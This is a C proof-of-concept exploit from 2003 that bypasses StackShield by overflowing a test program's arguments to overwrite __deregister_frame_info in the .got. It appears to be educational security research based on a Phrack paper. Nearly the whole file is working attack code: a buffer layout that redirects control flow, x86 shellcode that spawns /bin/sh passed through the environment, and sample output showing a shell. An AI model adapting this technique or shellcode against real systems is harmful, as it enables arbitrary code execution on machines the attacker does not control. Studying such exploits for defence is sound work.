/*
 * $Id: sg1-ex2.c,v 1.1.1.1 2004/05/29 14:15:05 raptor Exp $
 *
 * sg1-ex2.c - sg1.c exploit (stackshield protection bypass)
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * Another test exploit for the stackshield bypass technique outlined by
 * Bulba and Kil3r <lam3rz@hert.org> in their Phrack#56 paper titled
 * "Bypassing StackGuard and StackShield", very similar to sg1-ex.c.
 * This time we choose to overwite __deregister_frame_info in .got, but
 * it's also possible to use first function pointer in .dtors (or exit()
 * entry in .got, if present).
 *
 * Tested on Linux 2.4.21 with gcc-2.95.4.
 *
 * $ ./sg1-ex2
 * Using __dereg address: 0x80495e0
 * Using ret: 0xbfffffdd
 * sh-2.05a$ 
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define BUF1 	37			// (8 * 4) + 4 + 1
#define	BUF2	5			// 4 + 1
#define	VULN	"./sg1"			// the vulnerable program
#define	DEREG	0x080495e0		// address of __deregister_frame_info

char sc[] = /* linux/x86 shellcode */
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

int main(int argc, char *argv[])
{
	char *env[2] = {sc, NULL};
	char buf1[BUF1];
	char buf2[BUF2];

	int *p = (int *)(buf1);
	int ret = 0xbffffffa - strlen(sc) - strlen(VULN);

	fprintf(stderr, "Using __dereg address: %p\n", DEREG);
	fprintf(stderr, "Using ret: %p\n", ret);

	/* prepare argv[1] */
	memset(buf1, 'A', BUF1);
	p += 8;
	*p++ = DEREG;
	*p = 0x0;

	/* prepare argv[2] */
	p = (int *)(buf2);
	*p++ = ret;
	*p = 0x0;

	/* run the vulnerable program */
	execle(VULN, VULN + 2, buf1, buf2, NULL, env);
	//execle(VULN, VULN + 2, buf1, buf2, sc, NULL, NULL);
	perror("execle");
}
